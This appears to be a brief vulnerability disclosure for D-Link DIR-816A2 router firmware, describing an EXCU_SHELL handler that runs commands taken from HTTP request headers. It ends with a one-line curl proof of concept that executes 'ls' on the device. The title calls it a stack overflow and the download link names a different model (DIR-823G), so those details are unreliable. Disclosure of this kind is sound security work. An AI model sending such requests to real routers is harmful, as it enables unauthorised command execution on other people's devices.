# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-823G

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

The handler for the EXCU_SHEL path will detect the command in the request and execute it.

![](img/2.png#center)


## Vulnerability verify

![](img/3.png#center)


## POC

```
curl http://192.168.0.1/EXCU_SHELL -H 'Command1: ls' -H 'Confirm1: apply'
```
